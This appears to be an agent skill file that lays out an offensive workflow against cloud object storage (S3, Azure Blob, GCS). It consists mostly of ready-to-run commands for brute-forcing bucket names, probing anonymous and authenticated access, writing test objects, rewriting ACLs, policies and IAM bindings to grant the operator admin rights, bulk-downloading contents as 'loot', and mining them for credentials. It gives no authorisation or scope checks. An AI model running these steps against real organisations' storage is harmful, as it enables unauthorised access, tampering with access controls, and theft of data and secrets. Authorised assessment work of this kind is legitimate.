---
name: cloud-storage-exposure
description: Discover, permission-test, and exploit exposed object storage across S3, Azure Blob, and GCS — name permutation and brute discovery, the anonymous/any-authenticated/your-credential access matrix, write tests, and bulk exfiltration; use whenever assessing an org's storage footprint or when enumeration surfaces bucket/container names.
license: Apache-2.0
metadata:
  author: Section9Labs
  domain: cloud
---

# Cloud Storage Exposure

Offensive assessment of object storage: S3 buckets, Azure Blob containers, GCS
buckets. Flow: **discover names → test the three-identity matrix → escalate access
(policy/ACL/keys) → exfiltrate → mine the loot for secrets** (which re-enter
**cloud-credential-enumeration**).

Full per-provider matrix: `references/providers.md`. rupu wiring: `references/rupu.md`.

## 1. Discovery

### Name permutation + brute tools
Buckets live in GLOBAL namespaces — a name guessed correctly resolves regardless of
account. Generate candidates from org names, products, domains:

```
python3 scripts/permute_names.py --bases example,examplecorp,example-com \
    --out out/candidates.txt
```
(prefixes/suffixes: dev test stage staging prod uat qa backup backups data assets
static media logs archive internal public www cdn uploads terraform tfstate
artifacts build ci secrets db dump; separators `-`, `_`, `.`, none; region tags.)

Then run the brute tools:

```bash
# cloud_enum (initstring) — all three providers in one pass:
python3 cloud_enum.py -k example -k examplecorp -k example.com \
    --disable-azure-vm -l out/cloud_enum.log
# S3-focused, fast, checks anon list/write:
s3scanner -bucket-file out/candidates.txt -enumerate -json > out/s3scanner.json
# GCS brute (RhinoSecurityLabs) — unauth + authed TestIamPermissions:
python3 gcpbucketbrute.py -k example -u            # -u = unauthenticated
python3 gcpbucketbrute.py -k example -f sa.json    # authed: shows YOUR perms per bucket
# Azure blob/account enumeration (MicroBurst, PowerShell):
Invoke-EnumerateAzureBlobs -Base example -OutputFile out/azure_blobs.txt
```

### Known resources from enumeration
Pull bucket/container names from **cloudfox** (`cloudfox aws buckets`,
`cloudfox azure storage`), **aws-enumeration** / **azure-enumeration** /
**gcp-enumeration** work-units, scraped JS/HTML (`s3.amazonaws.com`,
`blob.core.windows.net`, `storage.googleapis.com` URLs), DNS CNAMEs, and
Terraform/CloudFormation in repos. Existence checks without tools:
S3 `curl -sI https://<b>.s3.amazonaws.com/` (404 NoSuchBucket vs 403 exists-denied),
GCS `curl -s https://storage.googleapis.com/<b>/`, Azure DNS resolution of
`<acct>.blob.core.windows.net`.

## 2. The three-identity permission matrix

Test EVERY discovered store as each of three identities — results routinely differ:

| Identity | S3 | Azure Blob | GCS |
|---|---|---|---|
| Anonymous | `aws s3 ls s3://b --no-sign-request` | `curl 'https://acct.blob.core.windows.net/c?restype=container&comp=list'` | `curl 'https://storage.googleapis.com/storage/v1/b/B/o'` |
| Any authenticated cloud user | ACL grantee `AuthenticatedUsers` (any AWS account — test with YOUR OWN account's creds) | n/a (Azure has no such grantee) | `allAuthenticatedUsers` member (any Google account — test with any Google-identity creds) |
| Your credential | `--profile target` | `--auth-mode login` / `--sas-token` / account key | active `gcloud` identity |

Key probes per provider (full detail in references/providers.md):

```bash
# ---- S3 ----
aws s3 ls s3://bucket --no-sign-request                      # anon list
aws s3 ls s3://bucket --profile target                       # authed list
aws s3api get-bucket-acl --bucket bucket                     # AllUsers / AuthenticatedUsers grants
aws s3api get-bucket-policy --bucket bucket                  # Principal:"*" statements
aws s3api get-public-access-block --bucket bucket            # PAB off => ACL/policy exposure is live
echo poc > poc.txt && aws s3 cp poc.txt s3://bucket/poc-$RANDOM.txt --no-sign-request   # anon WRITE test

# ---- Azure Blob ----
curl -s 'https://acct.blob.core.windows.net/container?restype=container&comp=list'      # anon list (XML)
curl -sI 'https://acct.blob.core.windows.net/container/known.txt'                       # anon blob read (container "blob"-level)
az storage container list --account-name acct --auth-mode login -o table
az storage blob list --account-name acct -c container --auth-mode login -o table
az storage blob list --account-name acct -c container --sas-token '<sv=...&sig=...>'
az storage account keys list -g RG -n acct                   # account-key abuse: full data-plane control

# ---- GCS ----
gcloud storage ls gs://bucket            # or legacy: gsutil ls gs://bucket
curl -s 'https://storage.googleapis.com/storage/v1/b/bucket/iam/testPermissions?permissions=storage.objects.list&permissions=storage.objects.get&permissions=storage.objects.create&permissions=storage.buckets.setIamPolicy'
gcloud storage buckets get-iam-policy gs://bucket            # allUsers / allAuthenticatedUsers bindings
printf poc > poc.txt && gcloud storage cp poc.txt gs://bucket/poc.txt     # write test
```

Automate the matrix:

```
python3 scripts/probe_storage.py --provider s3 --names-file out/candidates.txt \
    --profile target --write-test -o out/work-units.json --assets out/assets.json
python3 scripts/probe_storage.py --provider gcs --names-file out/candidates.txt -o out/gcs-units.json
python3 scripts/probe_storage.py --provider azure --account acct --names-file containers.txt -o out/az-units.json
```
It probes anonymous access via raw HTTP (urllib) and authenticated access via the
CLIs, records per-target access level (none/exists/listable/readable/writable),
and emits one work unit per ACCESSIBLE store. **Output: `out/work-units.json`.**

## 3. Escalate access

- **S3**: a readable `get-bucket-acl` showing `WRITE_ACP` for AllUsers lets you
  rewrite the ACL to grant `FULL_CONTROL`; `s3:PutBucketPolicy` lets you grant
  yourself everything (`aws s3api put-bucket-policy --bucket b --policy file://allow-me.json`).
  Check versioning (`get-bucket-versioning`) — deleted secrets live in old versions
  (`list-object-versions`).
- **Azure**: `az storage account keys list` with Contributor-level RBAC yields keys
  that bypass ALL RBAC/ACLs on the data plane; mint your own SAS:
  `az storage container generate-sas --account-name acct -n c --permissions rl --expiry 2030-01-01 --account-key KEY`.
  Check `allowBlobPublicAccess` on the account and per-container `--public-access`.
- **GCS**: `storage.buckets.setIamPolicy` on a bucket = grant
  `allUsers:roles/storage.admin` or yourself owner
  (`gcloud storage buckets add-iam-policy-binding gs://b --member=user:you@example.com --role=roles/storage.admin`).

## 4. Exfiltrate and mine

```bash
aws s3 sync s3://bucket ./loot/bucket --no-sign-request      # or --profile target
az storage blob download-batch --account-name acct -s container -d ./loot/acct-container --auth-mode login
az storage blob download-batch ... --sas-token '<SAS>'       # SAS variant
gcloud storage cp -r gs://bucket ./loot/bucket               # or gsutil -m cp -r
```
For huge buckets, list first and pull selectively: target `*.env`, `*.json`,
`*.pem`, `*.tfstate`, `*backup*`, `*.sql`, `config*`, `.git/`. Terraform state and
DB dumps are the highest-yield objects.

Hand every loot directory to **trufflehog**
(`trufflehog filesystem ./loot --json`); also `trufflehog s3 --bucket=bucket` and
`trufflehog gcs --project-id=...` scan in place without a full sync. Every
credential it finds goes to **cloud-credential-enumeration**.

## 5. Record and route

- Mark every discovered store as an asset; mark access level and secret-bearing
  status (`assets.mark` via the **coverage-assets** skill).
- Report every confirmed public-readable, public-writable, any-authenticated, or
  key/SAS-exposed store via `findings.report` (**finding-report** skill) with the
  exact reproduction command and the probe output as evidence. Public WRITE is
  critical (malware distribution / subdomain-takeover-grade); include your PoC
  object key.
- Work units in `out/work-units.json` feed rupu `for_each:`/dispatch — see
  `references/rupu.md`.
- Chain back: umbrella **cloud-security**; new creds → **cloud-credential-enumeration**;
  bucket-related IAM weaknesses → **cloud-privilege-escalation**; broader posture →
  **prowler** / **scoutsuite**.
